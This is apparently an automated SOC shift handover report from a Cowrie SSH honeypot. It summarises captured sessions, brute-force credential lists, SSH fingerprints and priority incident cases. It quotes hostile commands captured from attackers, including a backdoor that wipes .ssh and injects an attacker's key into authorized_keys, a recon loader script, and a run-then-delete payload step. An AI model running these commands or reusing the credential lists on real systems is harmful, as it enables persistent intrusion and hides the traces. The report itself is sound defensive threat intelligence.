# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-03 |
| **Generated At** | 2026-09-03T19:13:50Z |
| **Shift Time** | 19:13 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **333** |
| Confirmed Threats | **277** |
| False Positives Filtered | **56** (16.8%) |
| Unique Attacker IPs | **93** |
| Countries of Origin | **37** |
| High Severity Cases | **202** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **131** |
| Malware Samples Analyzed | **4** HIGH · **20** MED · 19 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **222** |
| Unique Credential Pairs | **170** |
| Unique Usernames | **27** |
| Unique Passwords | **151** |
| Successful Auth Pairs | **205** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 137 |
| `admin` | 25 |
| `345gs5662d34` | 14 |
| `support` | 7 |
| `user` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `support` | 7 |
| `LeitboGi0ro` | 5 |
| `admin` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `support` | `support` | 7 |
| `root` | `LeitboGi0ro` | 5 |
| `root` | `123@@@` | 4 |
| `admin` | `admin` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `ZXCvbn@123` | `217.60.255.130` | 2026-09-03T12:56:24 |
| `vubuntu` | `Indian123` | `217.60.255.130` | 2026-09-03T12:58:11 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-09-03T12:58:29 |
| `root` | `123@@@` | `165.1.75.106` | 2026-09-03T12:58:37 |
| `root` | `﻿------fuck------` | `111.39.190.137` | 2026-09-03T12:58:41 |
| `admin` | `admin` | `188.166.239.236` | 2026-09-03T13:07:08 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-03T13:07:09 |
| `root` | `Zaqwsx123` | `217.60.255.130` | 2026-09-03T13:07:25 |
| `admin` | `Power123` | `217.60.255.130` | 2026-09-03T13:07:55 |
| `user` | `123qwe!@#QWE` | `217.60.255.130` | 2026-09-03T13:17:20 |
| `root` | `QAZxsw@123` | `217.60.255.130` | 2026-09-03T13:18:02 |
| `support` | `support` | `176.53.159.196` | 2026-09-03T13:19:27 |
| `admin` | `Asd1234` | `217.60.255.130` | 2026-09-03T13:26:56 |
| `root` | `﻿------fuck------` | `59.63.188.244` | 2026-09-03T13:27:15 |
| `root` | `Salam@123` | `217.60.255.130` | 2026-09-03T13:28:49 |
| `admin` | `admin123!@#` | `217.60.255.130` | 2026-09-03T13:36:29 |
| `root` | `Salehi@123` | `217.60.255.130` | 2026-09-03T13:39:23 |
| `deploy` | `deploy@1234` | `217.60.255.130` | 2026-09-03T13:45:51 |
| `root` | `Matin123` | `217.60.255.130` | 2026-09-03T13:50:17 |
| `dev` | `dev@1234` | `217.60.255.130` | 2026-09-03T13:55:52 |
| `root` | `Test@123456` | `217.60.255.130` | 2026-09-03T14:01:47 |
| `dev` | `dev123` | `217.60.255.130` | 2026-09-03T14:05:46 |
| `root` | `Pass@1234!` | `217.60.255.130` | 2026-09-03T14:12:22 |
| `admin` | `rootpass` | `217.60.255.130` | 2026-09-03T14:15:17 |
| `root` | `centos` | `140.206.107.98` | 2026-09-03T14:21:42 |
| `root` | `Fara@123` | `217.60.255.130` | 2026-09-03T14:23:35 |
| `user` | `1qaz@WSX3edc` | `217.60.255.130` | 2026-09-03T14:25:12 |
| `root` | `111111` | `92.118.39.14` | 2026-09-03T14:30:56 |
| `root` | `1233218613f` | `201.63.223.140` | 2026-09-03T14:31:02 |
| `345gs5662d34` | `345gs5662d34` | `201.63.223.140` | 2026-09-03T14:31:05 |
| `root` | `3245gs5662d34` | `201.63.223.140` | 2026-09-03T14:31:06 |
| `root` | `123` | `92.118.39.14` | 2026-09-03T14:33:17 |
| `root` | `123QWEqwe!` | `217.60.255.130` | 2026-09-03T14:35:07 |
| `admin` | `!@#qaz123` | `217.60.255.130` | 2026-09-03T14:35:28 |
| `tin` | `123456` | `220.246.183.78` | 2026-09-03T14:35:28 |
| `345gs5662d34` | `345gs5662d34` | `220.246.183.78` | 2026-09-03T14:35:32 |
| `tin` | `3245gs5662d34` | `220.246.183.78` | 2026-09-03T14:35:33 |
| `root` | `123123` | `92.118.39.14` | 2026-09-03T14:35:37 |
| `root` | `123321` | `92.118.39.14` | 2026-09-03T14:37:53 |
| `root` | `1234` | `92.118.39.14` | 2026-09-03T14:40:11 |
| `root` | `12345` | `92.118.39.14` | 2026-09-03T14:42:27 |
| `user` | `123` | `217.60.255.130` | 2026-09-03T14:45:18 |
| `root` | `google.com` | `217.60.255.130` | 2026-09-03T14:46:06 |
| `root` | `1234567` | `92.118.39.14` | 2026-09-03T14:46:57 |
| `root` | `12345678` | `92.118.39.14` | 2026-09-03T14:49:11 |
| `root` | `123456789` | `92.118.39.14` | 2026-09-03T14:51:27 |
| `root` | `1234abcd` | `92.118.39.14` | 2026-09-03T14:53:44 |
| `user` | `Qwe@123` | `217.60.255.130` | 2026-09-03T14:55:10 |
| `root` | `123abc` | `92.118.39.14` | 2026-09-03T14:56:03 |
| `root` | `Admin@1234!` | `217.60.255.130` | 2026-09-03T14:57:12 |
| `root` | `123qwe` | `92.118.39.14` | 2026-09-03T14:58:20 |
| `root` | `1q2w3e` | `92.118.39.14` | 2026-09-03T15:00:36 |
| `admin` | `11111111` | `10.0.0.73` | 2026-09-03T15:02:33 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-03T15:02:38 |
| `admin` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T15:02:39 |
| `root` | `1q2w3e4r` | `92.118.39.14` | 2026-09-03T15:02:54 |
| `admin` | `Babylon5` | `217.60.255.130` | 2026-09-03T15:05:01 |
| `root` | `1qaz2wsx` | `92.118.39.14` | 2026-09-03T15:05:08 |
| `root` | `321` | `92.118.39.14` | 2026-09-03T15:07:22 |
| `root` | `Mail@123` | `217.60.255.130` | 2026-09-03T15:08:25 |
| `root` | `654321` | `92.118.39.14` | 2026-09-03T15:09:38 |
| `root` | `P@ssw0rd` | `92.118.39.14` | 2026-09-03T15:11:50 |
| `dhkim` | `dhkim` | `10.0.0.73` | 2026-09-03T15:13:28 |
| `dhkim` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T15:13:29 |
| `root` | `System123` | `10.0.0.73` | 2026-09-03T15:13:55 |
| `root` | `P@ssword` | `92.118.39.14` | 2026-09-03T15:14:09 |
| `admin` | `Password10` | `217.60.255.130` | 2026-09-03T15:14:52 |
| `root` | `Root123` | `92.118.39.14` | 2026-09-03T15:16:27 |
| `root` | `admin` | `92.118.39.14` | 2026-09-03T15:18:47 |
| `root` | `Ma@123` | `217.60.255.130` | 2026-09-03T15:19:47 |
| `root` | `admin123` | `92.118.39.14` | 2026-09-03T15:21:13 |
| `root` | `Asdfg@123` | `10.0.0.73` | 2026-09-03T15:21:16 |
| `root` | `letmein` | `92.118.39.14` | 2026-09-03T15:23:41 |
| `admin` | `!QAZxsw2#EDC` | `217.60.255.130` | 2026-09-03T15:25:13 |
| `root` | `pass` | `92.118.39.14` | 2026-09-03T15:26:07 |
| `ke` | `ke` | `135.125.226.143` | 2026-09-03T15:26:44 |
| `345gs5662d34` | `345gs5662d34` | `135.125.226.143` | 2026-09-03T15:26:46 |
| `ke` | `3245gs5662d34` | `135.125.226.143` | 2026-09-03T15:26:47 |
| `root` | `passw0rd` | `92.118.39.14` | 2026-09-03T15:28:24 |
| `root` | `password` | `92.118.39.14` | 2026-09-03T15:30:37 |
| `sa` | `123` | `157.20.37.254` | 2026-09-03T15:30:45 |
| `345gs5662d34` | `345gs5662d34` | `157.20.37.254` | 2026-09-03T15:30:50 |
| `sa` | `3245gs5662d34` | `157.20.37.254` | 2026-09-03T15:30:52 |
| `root` | `Qq@123456` | `217.60.255.130` | 2026-09-03T15:31:21 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-03T15:32:29 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-03T15:32:31 |
| `root` | `password1` | `92.118.39.14` | 2026-09-03T15:32:49 |
| `root` | `qwerty` | `92.118.39.14` | 2026-09-03T15:35:05 |
| `demo` | `demo@123` | `217.60.255.130` | 2026-09-03T15:35:39 |
| `root` | `r00t` | `92.118.39.14` | 2026-09-03T15:37:24 |
| `root` | `root!@#` | `92.118.39.14` | 2026-09-03T15:42:19 |
| `root` | `ab@123456` | `217.60.255.130` | 2026-09-03T15:42:30 |
| `root` | `root#123` | `92.118.39.14` | 2026-09-03T15:44:40 |
| `node` | `node@2025` | `217.60.255.130` | 2026-09-03T15:45:23 |
| `root` | `root0000` | `92.118.39.14` | 2026-09-03T15:46:50 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-09-03T15:47:01 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-09-03T15:47:02 |
| `root` | `123@@@` | `144.22.238.238` | 2026-09-03T15:47:06 |
| `root` | `root1111` | `92.118.39.14` | 2026-09-03T15:49:03 |
| `root` | `root123` | `92.118.39.14` | 2026-09-03T15:51:14 |
| `root` | `Ss@12345` | `217.60.255.130` | 2026-09-03T15:53:09 |
| `root` | `root1234` | `92.118.39.14` | 2026-09-03T15:53:26 |
| `@dmin` | `@admin` | `217.60.255.130` | 2026-09-03T15:54:42 |
| `root` | `root2024` | `92.118.39.14` | 2026-09-03T15:55:40 |
| `root` | `root2222` | `92.118.39.14` | 2026-09-03T15:57:51 |
| `root` | `root321` | `92.118.39.14` | 2026-09-03T16:00:08 |
| `root` | `root4444` | `92.118.39.14` | 2026-09-03T16:02:34 |
| `root` | `Marketing@123` | `217.60.255.130` | 2026-09-03T16:03:56 |
| `admin` | `nimda@123` | `217.60.255.130` | 2026-09-03T16:04:17 |
| `root` | `root5555` | `92.118.39.14` | 2026-09-03T16:04:57 |
| `root` | `root5678` | `92.118.39.14` | 2026-09-03T16:07:11 |
| `root` | `root6666` | `92.118.39.14` | 2026-09-03T16:09:23 |
| `root` | `root9999` | `92.118.39.14` | 2026-09-03T16:11:39 |
| `administrator` | `p@ssw0rd` | `217.60.255.130` | 2026-09-03T16:13:52 |
| `root` | `root@123` | `92.118.39.14` | 2026-09-03T16:13:58 |
| `root` | `P@55w0rd@123` | `217.60.255.130` | 2026-09-03T16:14:32 |
| `root` | `rootaccess` | `92.118.39.14` | 2026-09-03T16:16:20 |
| `root` | `rootadmin` | `92.118.39.14` | 2026-09-03T16:18:45 |
| `admin` | `test123` | `217.60.255.130` | 2026-09-03T16:23:21 |
| `root` | `Server2019` | `217.60.255.130` | 2026-09-03T16:25:22 |
| `root` | `zw123456!` | `179.57.170.71` | 2026-09-03T16:30:07 |
| `345gs5662d34` | `345gs5662d34` | `179.57.170.71` | 2026-09-03T16:30:10 |
| `root` | `3245gs5662d34` | `179.57.170.71` | 2026-09-03T16:30:11 |
| `stalker` | `stalker` | `75.119.149.212` | 2026-09-03T16:30:19 |
| `345gs5662d34` | `345gs5662d34` | `75.119.149.212` | 2026-09-03T16:30:22 |
| `stalker` | `3245gs5662d34` | `75.119.149.212` | 2026-09-03T16:30:23 |
| `pi` | `q1w2e3r4t5` | `217.60.255.130` | 2026-09-03T16:32:48 |
| `deployuser` | `deployuser123!` | `187.207.48.99` | 2026-09-03T16:32:58 |
| `345gs5662d34` | `345gs5662d34` | `187.207.48.99` | 2026-09-03T16:33:00 |
| `deployuser` | `3245gs5662d34` | `187.207.48.99` | 2026-09-03T16:33:01 |
| `root` | `!root` | `2.57.122.209` | 2026-09-03T16:33:21 |
| `root` | `ZabTharwat@2025` | `218.51.148.194` | 2026-09-03T16:36:07 |
| `345gs5662d34` | `345gs5662d34` | `218.51.148.194` | 2026-09-03T16:36:10 |
| `root` | `3245gs5662d34` | `218.51.148.194` | 2026-09-03T16:36:11 |
| `root` | `Sasan@123` | `217.60.255.130` | 2026-09-03T16:36:17 |
| `root` | `111111` | `2.57.122.209` | 2026-09-03T16:36:41 |
| `root` | `123123` | `2.57.122.209` | 2026-09-03T16:39:49 |
| `admin` | `Admin@12345` | `217.60.255.130` | 2026-09-03T16:42:24 |
| `root` | `123321` | `2.57.122.209` | 2026-09-03T16:42:49 |
| `root` | `1234` | `2.57.122.209` | 2026-09-03T16:45:42 |
| `root` | `Nexus@123` | `217.60.255.130` | 2026-09-03T16:47:08 |
| `admin` | `147258` | `10.0.0.73` | 2026-09-03T16:47:53 |
| `support` | `support` | `10.0.0.73` | 2026-09-03T16:48:33 |
| `root` | `12345` | `2.57.122.209` | 2026-09-03T16:48:40 |
| `sagar` | `sagar` | `10.0.0.73` | 2026-09-03T16:49:52 |
| `sagar` | `3245gs5662d34` | `10.0.0.73` | 2026-09-03T16:49:57 |
| `admin` | `Password1!` | `217.60.255.130` | 2026-09-03T16:51:59 |
| `admin` | `admin` | `68.178.166.175` | 2026-09-03T16:54:11 |
| `root` | `1234567` | `2.57.122.209` | 2026-09-03T16:54:39 |
| `root` | `12345678` | `2.57.122.209` | 2026-09-03T16:57:30 |
| `root` | `AAAaaa@123` | `217.60.255.130` | 2026-09-03T16:57:39 |
| `root` | `123456789` | `2.57.122.209` | 2026-09-03T17:00:12 |
| `test` | `asd@123` | `217.60.255.130` | 2026-09-03T17:01:23 |
| `root` | `1234567890` | `2.57.122.209` | 2026-09-03T17:02:55 |
| `root` | `123456a` | `2.57.122.209` | 2026-09-03T17:05:27 |
| `root` | `123456b` | `2.57.122.209` | 2026-09-03T17:08:04 |
| `root` | `Kek123` | `217.60.255.130` | 2026-09-03T17:08:37 |
| `root` | `1234abcd` | `2.57.122.209` | 2026-09-03T17:10:49 |
| `oracle` | `Welcome123` | `217.60.255.130` | 2026-09-03T17:10:58 |
| `root` | `123abc` | `2.57.122.209` | 2026-09-03T17:14:08 |
| `root` | `123qwe` | `2.57.122.209` | 2026-09-03T17:16:42 |
| `root` | `Hayat123` | `217.60.255.130` | 2026-09-03T17:19:25 |
| `root` | `1q2w3e4r` | `2.57.122.209` | 2026-09-03T17:19:38 |
| `Test` | `Test@123` | `217.60.255.130` | 2026-09-03T17:20:32 |
| `root` | `1qaz2wsx` | `2.57.122.209` | 2026-09-03T17:22:38 |
| `root` | `1qaz@WSX` | `2.57.122.209` | 2026-09-03T17:25:38 |
| `root` | `21` | `2.57.122.209` | 2026-09-03T17:28:38 |
| `admin` | `1368` | `217.60.255.130` | 2026-09-03T17:29:52 |
| `root` | `Cesur123` | `217.60.255.130` | 2026-09-03T17:29:59 |
| `root` | `321` | `2.57.122.209` | 2026-09-03T17:31:08 |
| `root` | `4321` | `2.57.122.209` | 2026-09-03T17:33:41 |
| `root` | `54321` | `2.57.122.209` | 2026-09-03T17:36:02 |
| `root` | `555555` | `2.57.122.209` | 2026-09-03T17:38:25 |
| `admin` | `google.com` | `217.60.255.130` | 2026-09-03T17:39:30 |
| `root` | `654321` | `2.57.122.209` | 2026-09-03T17:40:48 |
| `root` | `p@55w0rd` | `217.60.255.130` | 2026-09-03T17:40:52 |
| `root` | `7777777` | `2.57.122.209` | 2026-09-03T17:43:08 |
| `root` | `Admin2026!` | `2.57.122.209` | 2026-09-03T17:45:31 |
| `root` | `P4ssw0rd` | `2.57.122.209` | 2026-09-03T17:47:49 |
| `sys` | `Vmware@123` | `217.60.255.130` | 2026-09-03T17:49:00 |
| `root` | `P4ssword` | `2.57.122.209` | 2026-09-03T17:50:08 |
| `root` | `123456a@` | `217.60.255.130` | 2026-09-03T17:51:32 |
| `root` | `P@ssw0rd` | `2.57.122.209` | 2026-09-03T17:52:32 |
| `root` | `docker` | `36.133.163.5` | 2026-09-03T17:53:50 |
| `root` | `P@ssw0rd2026` | `2.57.122.209` | 2026-09-03T17:55:06 |
| `root` | `P@ssword` | `2.57.122.209` | 2026-09-03T17:57:25 |
| `admin` | `System@2024` | `217.60.255.130` | 2026-09-03T17:58:28 |
| `root` | `Passw0rd` | `2.57.122.209` | 2026-09-03T17:59:42 |
| `root` | `Ff123!@#` | `217.60.255.130` | 2026-09-03T18:02:25 |
| `sys` | `Ff123!@#` | `217.60.255.130` | 2026-09-03T18:08:08 |
| `root` | `Tarik1234` | `217.60.255.130` | 2026-09-03T18:13:24 |
| `test` | `admin12345` | `217.60.255.130` | 2026-09-03T18:17:50 |
| `igor` | `igor1234` | `115.190.197.74` | 2026-09-03T18:21:51 |
| `map` | `map123` | `103.70.40.36` | 2026-09-03T18:22:24 |
| `345gs5662d34` | `345gs5662d34` | `103.70.40.36` | 2026-09-03T18:22:29 |
| `map` | `3245gs5662d34` | `103.70.40.36` | 2026-09-03T18:22:32 |
| `root` | `Password2015` | `217.60.255.130` | 2026-09-03T18:24:22 |
| `mcadmin` | `1234` | `163.7.3.241` | 2026-09-03T18:24:27 |
| `345gs5662d34` | `345gs5662d34` | `163.7.3.241` | 2026-09-03T18:24:32 |
| `mcadmin` | `3245gs5662d34` | `163.7.3.241` | 2026-09-03T18:24:34 |
| `sys` | `Password2015` | `217.60.255.130` | 2026-09-03T18:27:26 |
| `root` | `!@#$%^&*()` | `217.60.255.130` | 2026-09-03T18:35:13 |
| `admin` | `1qaz2wsx` | `217.60.255.130` | 2026-09-03T18:37:05 |
| `root` | `Newuser@123` | `217.60.255.130` | 2026-09-03T18:46:21 |
| `admin` | `1qazZAQ!` | `217.60.255.130` | 2026-09-03T18:46:56 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **333** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 107 |
| libssh | 104 |
| Paramiko (Python) | 19 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 81 | 2 |
| `419da4c91ddb...` | Modern SSH client | 70 | 1 |
| `f555226df196...` | Mirai/variant | 32 | 12 |
| `a2de0f306611...` | Mirai/variant | 11 | 3 |
| `87e3d9ffee05...` | Mirai/variant | 8 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 81 | 2 | Mirai/variant |
| `419da4c91ddb...` | libssh | 70 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 32 | 12 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 13 | 9 | — |
| `a2de0f306611...` | Paramiko (Python) | 11 | 3 | Mirai/variant |
| `87e3d9ffee05...` | Paramiko (Python) | 8 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 3 | 3 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 78 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 11 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.14`, `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.20.37.254`, `103.70.40.36`, `135.125.226.143`, `218.51.148.194`, `179.57.170.71`, `187.207.48.99`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **93** |
| Unique ASNs | **58** |
| High-Risk ASNs | **35** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 19 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 3 | LOW |
| `AS396982` | Google LLC | 3 | LOW |
| `AS11664` | Techtel LMDS Comunicaciones Interactivas S.A. | 2 | HIGH |
| `AS39608` | Lanet Network Ltd | 2 | LOW |
| `AS16509` | Amazon.com, Inc. | 2 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (202)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d1bad8277efc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:56 |
| **Last Seen** | 2026-09-03 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:56:23` | `cowrie.session.connect` |
| `2026-09-03 12:56:23` | `cowrie.client.version` |
| `2026-09-03 12:56:23` | `cowrie.client.kex` |
| `2026-09-03 12:56:24` | `cowrie.login.success` |
| `2026-09-03 12:56:24` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:56:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:56:24` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb8f2800bd19

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 12:58 |
| **Last Seen** | 2026-09-03 12:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:58:10` | `cowrie.session.connect` |
| `2026-09-03 12:58:10` | `cowrie.client.version` |
| `2026-09-03 12:58:10` | `cowrie.client.kex` |
| `2026-09-03 12:58:11` | `cowrie.login.success` |
| `2026-09-03 12:58:11` | `cowrie.direct-tcpip.request` |
| `2026-09-03 12:58:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 12:58:11` | `cowrie.direct-tcpip.data` |
| `2026-09-03 12:58:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63e37983f03

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-03 12:58 |
| **Last Seen** | 2026-09-03 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:58:29` | `cowrie.session.connect` |
| `2026-09-03 12:58:29` | `cowrie.client.version` |
| `2026-09-03 12:58:29` | `cowrie.client.kex` |
| `2026-09-03 12:58:29` | `cowrie.login.success` |
| `2026-09-03 12:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6136a8ca118

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-03 12:58 |
| **Last Seen** | 2026-09-03 13:00 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:58:36` | `cowrie.session.connect` |
| `2026-09-03 12:58:36` | `cowrie.client.version` |
| `2026-09-03 12:58:36` | `cowrie.client.kex` |
| `2026-09-03 12:58:36` | `cowrie.login.success` |
| `2026-09-03 12:58:37` | `cowrie.session.file_upload` |
| `2026-09-03 12:58:38` | `cowrie.session.params` |
| `2026-09-03 12:58:38` | `cowrie.command.input` |
| `2026-09-03 12:58:38` | `cowrie.command.input` |
| `2026-09-03 12:58:38` | `cowrie.command.input` |
| `2026-09-03 12:58:38` | `cowrie.command.failed` |
| `2026-09-03 12:58:38` | `cowrie.log.closed` |
| `2026-09-03 12:58:39` | `cowrie.session.params` |
| `2026-09-03 12:58:39` | `cowrie.command.input` |
| `2026-09-03 12:58:39` | `cowrie.log.closed` |
| `2026-09-03 12:58:40` | `cowrie.session.params` |
| `2026-09-03 12:58:40` | `cowrie.command.input` |
| `2026-09-03 12:58:40` | `cowrie.log.closed` |
| `2026-09-03 12:58:41` | `cowrie.session.params` |
| `2026-09-03 12:58:41` | `cowrie.command.input` |
| `2026-09-03 12:58:41` | `cowrie.command.failed` |
| `2026-09-03 12:58:41` | `cowrie.command.failed` |
| `2026-09-03 12:59:42` | `cowrie.session.params` |
| `2026-09-03 12:59:42` | `cowrie.command.input` |
| `2026-09-03 13:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e800983054b3

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-03 12:58 |
| **Last Seen** | 2026-09-03 12:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 12:58:36` | `cowrie.session.connect` |
| `2026-09-03 12:58:36` | `cowrie.client.version` |
| `2026-09-03 12:58:37` | `cowrie.client.kex` |
| `2026-09-03 12:58:37` | `cowrie.login.success` |
| `2026-09-03 12:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-407135cc128a

| Field | Detail |
|---|---|
| **Source IP** | `111.39.190[.]137` |
| **First Seen** | 2026-09-03 12:58 |
| **Last Seen** | 2026-09-03 12:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
